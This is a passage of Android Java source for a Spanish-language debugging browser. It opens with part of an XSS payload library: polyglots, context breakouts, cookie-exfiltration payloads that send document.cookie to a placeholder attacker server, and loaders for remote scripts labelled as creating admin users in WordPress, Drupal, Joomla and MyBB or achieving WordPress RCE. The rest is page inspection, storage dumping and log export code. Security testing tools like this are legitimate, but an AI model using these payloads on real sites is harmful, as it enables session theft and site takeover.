        {"Polyglots", "", "<script itworksinallbrowsers>/*<script* */alert(document.domain)</script"},
        {"Polyglots", "", "<script /***/>/***/alert(document.domain)/***/</script /***/>"},
        {"Exfiltración", "exfiltración", "<script src=\"https://TU-SERVIDOR/x.js\"></script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(\"https://TU-SERVIDOR/?c=\"+document.cookie)</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(\"https://TU-SERVIDOR/?c=\".concat(document.cookie))</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch([\"https://TU-SERVIDOR/?c=\",document.cookie].join())</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(`https://TU-SERVIDOR/?c=${document.cookie}`)</script>"},
        {"Exfiltración", "exfiltración", "<script>document.location=\"https://TU-SERVIDOR/?c=\"+document.cookie</script>"},
        {"Exfiltración", "exfiltración", "<script>window.location.assign(\"https://TU-SERVIDOR/?c=\"+document.cookie)</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(\"https://TU-SERVIDOR/?c=\"+doc\\u0075ment.cookie)</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(\"https://TU-SERVIDOR/?c=\"+window[\"doc\"+\"ument\"][\"cookie\"])</script>"},
        {"Exfiltración", "exfiltración", "<script>fetch(\"https://TU-SERVIDOR/?c=\"+document['cookie'])</script>"},
        {"Exfiltración", "exfiltración", "<script>var s=document.createElement('script');s.src='https://TU-SERVIDOR/payload.js';document.body.appendChild(s)</script>"},
        {"Exfiltración", "exfiltración", "<script>var c=function(){a()};var s=document.createElement('script');s.src='https://TU-SERVIDOR/payload.js';s.onreadystatechange=c;document.body.appendChild(s)</script>"},
        {"Contexto atributo", "", "\"><svg onload=alert(document.domain)>"},
        {"Contexto atributo", "ratón", "' onmouseover=alert(document.domain)"},
        {"Contexto atributo", "", "\"><script>alert(document.domain)</script>"},
        {"Contexto atributo", "", "&#34;&#62;<svg onload=alert(document.domain)>"},
        {"Contexto atributo", "", "x\" onfocus=alert(document.domain) autofocus=\""},
        {"Contexto script / CSS", "", "\";alert(document.domain);//"},
        {"Contexto script / CSS", "", "';\\u0061lert(document.domain);//"},
        {"Contexto script / CSS", "", "</script><svg onload=alert(document.domain)>"},
        {"Contexto script / CSS", "", "</script><img src=x onerror=alert(document.domain)>"},
        {"Contexto script / CSS", "", "1;alert(document.domain)//"},
        {"Contexto script / CSS", "exfiltración", "</script><script src=\"https://TU-SERVIDOR/x.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: WP, crea usuario admin; requiere sesión de administrador", "<script src=\"https://TU-SERVIDOR/wordpress_create_admin_user.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: WP, crea un post; requiere sesión de autor/admin", "<script src=\"https://TU-SERVIDOR/wordpress_create_post.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: Drupal, crea usuario admin; requiere sesión de administrador", "<script src=\"https://TU-SERVIDOR/drupal_create_admin_user.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: Joomla, crea usuario admin; requiere sesión de administrador", "<script src=\"https://TU-SERVIDOR/joomla_create_admin_user.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: MyBB, crea usuario admin; requiere sesión de administrador", "<script src=\"https://TU-SERVIDOR/mybb_create_admin_user.js\"></script>"},
        {"Cargadores y escalado", "exfiltración: WP, RCE vía editor de temas; requiere jQuery en la página y sesión de administrador", "<script>jQuery.getScript('https://TU-SERVIDOR/wordpress_rce.js',function(){main()})</script>"},
        {"Cargadores y escalado", "exfiltración: plantilla iframe-CSRF; hay que poner la URL real y el formulario destino", "<script>var f=document.createElement('iframe');f.onload=function(){var d=f.contentDocument;d.querySelector('form').submit()};f.src='/ruta/sensible';document.body.append(f)</script>"},
    };

    private String libraryCategory = "Bypass de WAF";

    private java.util.ArrayList<String> xssLibraryCategories() {
        java.util.ArrayList<String> out = new java.util.ArrayList<>();
        for (String[] row : XSS_LIBRARY) if (!out.contains(row[0])) out.add(row[0]);
        return out;
    }

    private java.util.ArrayList<String[]> xssLibraryByCategory(String category) {
        java.util.ArrayList<String[]> out = new java.util.ArrayList<>();
        for (String[] row : XSS_LIBRARY) if (row[0].equals(category)) out.add(row);
        return out;
    }

    private java.util.ArrayList<String> xssLibraryAlertPayloads() {
        java.util.ArrayList<String> out = new java.util.ArrayList<>();
        for (String[] row : XSS_LIBRARY) if (!row[1].startsWith("exfiltración")) out.add(row[2]);
        return out;
    }

    private String firstLibraryPayload(String category) {
        for (String[] row : XSS_LIBRARY) if (row[0].equals(category)) return row[2];
        return "<img src=x onerror=alert(document.domain)>";
    }

    private void analyzeJsBundles() {
        String js = "JSON.stringify((function(){"
                + "var list = performance.getEntriesByType('resource').filter(function(e){"
                + "return e.initiatorType === 'script' || /\\.js(\\?|#|$)/i.test(e.name);"
                + "}).map(function(e){"
                + "return {url: e.name, kb: Math.round((e.transferSize || 0) / 102.4) / 10, ms: Math.round(e.duration)};"
                + "});"
                + "var totalKb = list.reduce(function(a, b){ return a + b.kb; }, 0);"
                + "var slowest = list.slice().sort(function(a, b){ return b.ms - a.ms; }).slice(0, 5);"
                + "return {count: list.length, totalKb: Math.round(totalKb * 10) / 10, slowest: slowest, items: list.slice(0, 50)};"
                + "})())";
        webView.evaluateJavascript(js, value -> {
            jsBundlesJson = unquote(value);
            jsBundlesSummary = formatJsBundles(jsBundlesJson);
            jsPayloadLabels.clear();
            jsPayloadValues.clear();
            jsSinkResults = null;
            jsSinkFindings.clear();
            renderNow();
        });
    }

    private String formatJsBundles(String json) {
        try {
            org.json.JSONObject data = new org.json.JSONObject(json);
            org.json.JSONArray items = data.optJSONArray("items");
            StringBuilder out = new StringBuilder();
            out.append("Bundles JS: ").append(data.optInt("count")).append("  •  Total: ").append(data.optDouble("totalKb")).append(" KB\n");
            if (items == null || items.length() == 0) return out.append("La página no cargó bundles JS detectables.").toString();
            out.append("Los más lentos:\n");
            org.json.JSONArray slowest = data.optJSONArray("slowest");
            if (slowest != null) {
                for (int i = 0; i < slowest.length(); i++) {
                    org.json.JSONObject item = slowest.optJSONObject(i);
                    if (item != null) out.append("• ").append(item.optInt("ms")).append(" ms  ").append(shortUrl(item.optString("url"))).append("\n");
                }
            }
            out.append("Todos:\n");
            for (int i = 0; i < items.length(); i++) {
                org.json.JSONObject item = items.optJSONObject(i);
                if (item != null) out.append("• ").append(item.optDouble("kb")).append(" KB  ").append(item.optInt("ms")).append(" ms  ").append(shortUrl(item.optString("url"))).append("\n");
            }
            return out.toString();
        } catch (Exception e) {
            return "No se pudo analizar los bundles: " + json;
        }
    }

    private String shortUrl(String url) {
        if (url == null) return "(sin URL)";
        int cut = url.indexOf('?');
        String clean = cut >= 0 ? url.substring(0, cut) : url;
        if (clean.length() > 80) return "…" + clean.substring(clean.length() - 79);
        return clean;
    }

    private void inspectTouchedElement() {
        float scale = webView.getScale() * getResources().getDisplayMetrics().density; float x = lastTouchX / scale; float y = lastTouchY / scale;
        String js = "(function(){var e=document.elementFromPoint(" + x + "," + y + ");if(!e)return 'No se encontró elemento';var s=getComputedStyle(e);return 'Etiqueta: '+e.tagName.toLowerCase()+'\\nSelector: '+(e.id?'#'+e.id:e.tagName.toLowerCase()+(e.className&&typeof e.className==='string'?'.'+e.className.trim().replace(/\\s+/g,'.'):''))+'\\nTexto: '+(e.innerText||e.textContent||'').trim().slice(0,300)+'\\nHTML: '+e.outerHTML.slice(0,1000)+'\\n\\nCSS calculado: color='+s.color+'; background='+s.backgroundColor+'; font='+s.font+'; display='+s.display+'; margin='+s.margin+'; padding='+s.padding;})()";
        webView.evaluateJavascript(js, value -> showResult("Elemento y estilos", unquote(value)));
    }
    private void inspectStorage() {
        webView.evaluateJavascript("(function(){function dump(s){var o={};for(var i=0;i<s.length;i++){var k=s.key(i);o[k]=s.getItem(k)}return o}return JSON.stringify({url:location.origin,local:dump(localStorage),session:dump(sessionStorage)})})()", value -> showResult("Almacenamiento del sitio", unquote(value)));
    }
    private void clearSiteData() {
        String pageUrl = webView.getUrl() == null ? "https://example.com" : webView.getUrl();
        String host = Uri.parse(pageUrl).getHost();
        webView.evaluateJavascript("try{localStorage.clear();sessionStorage.clear();'Almacenamiento borrado'}catch(e){e.message}", value -> {
            CookieManager cookies = CookieManager.getInstance();
            String cookieString = cookies.getCookie(pageUrl);
            if (cookieString != null) {
                for (String cookie : cookieString.split(";")) {
                    String name = cookie.split("=", 2)[0].trim();
                    cookies.setCookie(pageUrl, name + "=; Max-Age=0; Path=/; SameSite=Lax");
                }
            }
            cookies.flush();
            runOnUiThread(() -> { webView.reload(); Toast.makeText(this, "Datos locales y cookies accesibles del sitio borrados", Toast.LENGTH_SHORT).show(); addConsole("INFO", "Datos del sitio borrados: " + host, "inspector"); });
        });
    }
    private String unquote(String value) {
        if (value == null) return "(sin datos)";
        try { return new org.json.JSONTokener(value).nextValue().toString(); } catch (Exception e) { return value; }
    }
    private void showResult(String title, String value) {
        runOnUiThread(() -> new android.app.AlertDialog.Builder(this).setTitle(title).setMessage(value).setPositiveButton("Copiar", (d,w) -> { ClipboardManager cm=(ClipboardManager)getSystemService(CLIPBOARD_SERVICE); cm.setPrimaryClip(ClipData.newPlainText(title,value)); Toast.makeText(this,"Copiado",Toast.LENGTH_SHORT).show(); }).setNegativeButton("Cerrar",null).show());
    }
    private void clearRecords() {
        if (activePanel.equals("RED")) networkRecords.clear(); else consoleRecords.clear(); renderNow();
    }
    private void exportRecords() {
        List<String> records = activePanel.equals("RED") ? networkRecords : consoleRecords;
        StringBuilder out = new StringBuilder("URL: ").append(webView.getUrl()).append("\n\n");
        synchronized (records) { for (String record : records) out.append(record).append("\n\n"); }
        Intent intent = new Intent(Intent.ACTION_SEND); intent.setType("text/plain"); intent.putExtra(Intent.EXTRA_SUBJECT, "Debug Browser - " + activePanel); intent.putExtra(Intent.EXTRA_TEXT, out.toString()); startActivity(Intent.createChooser(intent, "Exportar registros"));
    }
    private Button button(String text) { Button b=new Button(this); b.setText(text); b.setTextColor(Color.WHITE); b.setAllCaps(false); b.setPadding(0,0,0,0); return b; }
    private int dp(int value) { return (int)(value*getResources().getDisplayMetrics().density+0.5f); }
    @Override public void onBackPressed() { if (webView != null && webView.canGoBack()) webView.goBack(); else super.onBackPressed(); }
    @Override protected void onDestroy() { uiHandler.removeCallbacks(renderRunnable); renderPending = false; if (cdpNetworkClient != null) cdpNetworkClient.stop(); if (webView != null) webView.destroy(); super.onDestroy(); }
}
